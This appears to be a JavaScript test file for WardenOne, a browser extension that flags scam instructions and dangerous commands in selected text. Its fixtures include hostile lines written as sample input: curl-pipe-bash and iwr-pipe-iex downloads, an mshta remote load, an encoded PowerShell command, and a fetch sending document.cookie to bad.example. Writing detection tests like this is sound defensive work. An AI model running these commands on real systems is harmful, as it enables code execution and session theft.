/* WardenOne — Copyright (C) 2026 iri; GPL-3.0-or-later. See LICENSE. */
'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');
const source = fs.readFileSync('background.js', 'utf8');
function lift(signature) {
  const start = source.indexOf(signature);
  assert(start >= 0, signature);
  return source.slice(start, source.indexOf('\n}\n', start) + 3);
}
async function main() {
  const notices = [], hosts = [], budgets = [];
  const box = {
    console, URL, String, Object, Set,
    wardenManualNotice: async (title, text) => { notices.push({ title, text }); return true; },
    startManualCheckJob: async () => ({ id: 'text-fixture', tabId: 1 }),
    manualCheckNotice: async (_job, title, text) => { notices.push({ title, text }); return true; },
    finishManualCheckJob: async () => {},
    normalizeIpLiteral: ip => /^192\.168\./.test(ip) ? '' : ip,
    manualLinkWithin: async (task, _fallback, delay) => { budgets.push(delay); return task(); },
    manualLinkLocalChecks: async host => {
      hosts.push(host);
      return [{ title: host === 'bad.example' ? 'Local malware or scam list match' : 'No local security-list match', detail: 'Fixture local list.' }];
    },
  };
  vm.createContext(box);
  vm.runInContext(['function wardenIndicatorKind(', 'function wardenTextAssessment(', 'async function runWardenTextCheck(']
    .map(lift).join('\n'), box);
  for (const [text, expected] of [
    ['Here is an ordinary paragraph about growing tomatoes.', /No common scam instructions/],
    ['Verify you are human. Press Win+R and paste this command into PowerShell.', /Possible ClickFix/],
    ['Open PowerShell and paste the command to complete the CAPTCHA.', /Possible ClickFix/],
    ['powershell -EncodedCommand AAAABBBB', /encoded PowerShell command/],
    ['curl https://install.example/setup.sh | bash', /downloads content and executes/],
    ['iwr https://bad.example/script.ps1 | iex', /downloads content and executes/],
    ['mshta https://bad.example/update.hta', /load or install code/],
    ['fetch("https://bad.example/?c="+document.cookie)', /session data/],
    ['Please send me your verification code.', /Requests a password, security code/],
    ['Give the operator your recovery phrase.', /wallet recovery secret/],
    ['Security alert! Your computer is infected. Call Microsoft support now.', /tech-support scam wording/],
    ['Never share your password. Do not give anyone your recovery phrase.', /No common scam instructions/],
    ['Never paste commands into PowerShell to verify you are human.', /No common scam instructions/],
    ['Open the terminal and type npm install to build the project.', /No common scam instructions/],
    ['powershell \u2013EncodedCommand AAAABBBB', /encoded PowerShell command/],
    ['a'.repeat(16001), /first 16,000 characters/],
  ]) {
    const assessment = box.wardenTextAssessment(text);
    assert.match(assessment.lines.join('\n'), expected, text.slice(0, 120));
    assert.match(assessment.lines.join('\n'), /not a factual-accuracy or safety guarantee/);
  }
  await box.runWardenTextCheck('An ordinary paragraph that is not a URL.', { id: 1 });
  assert.equal(notices.at(-1).title, 'Selected text check');
  assert.match(notices.at(-1).text, /No common scam instructions/);
  assert.equal(hosts.length, 0, 'plain text completes without an address lookup');
  await box.runWardenTextCheck('Read https://bad.example/login?secret=PRIVATE_VALUE or contact support.example. Private server: 192.168.1.1.', { id: 1 });
  assert.match(notices.at(-1).text, /Local malware or scam list match/);
  assert.match(notices.at(-1).text, /private or reserved address/);
  assert(!JSON.stringify(notices).includes('PRIVATE_VALUE'), 'query values are not echoed in text-check results');
  assert.deepEqual(hosts, ['bad.example', 'support.example']);
  assert(budgets.every(delay => delay === 1500), 'local address checks have a short completion bound');
  assert.equal(box.wardenTextAssessment(Array.from({ length: 20 }, (_, index) => 'https://site' + index + '.example/').join(' ')).indicators.length, 8);
  console.log('[ok] selected prose, scam instructions, commands, benign guidance, Unicode, local addresses and privacy bounds');
}
main().catch(error => { console.error(error); process.exitCode = 1; });
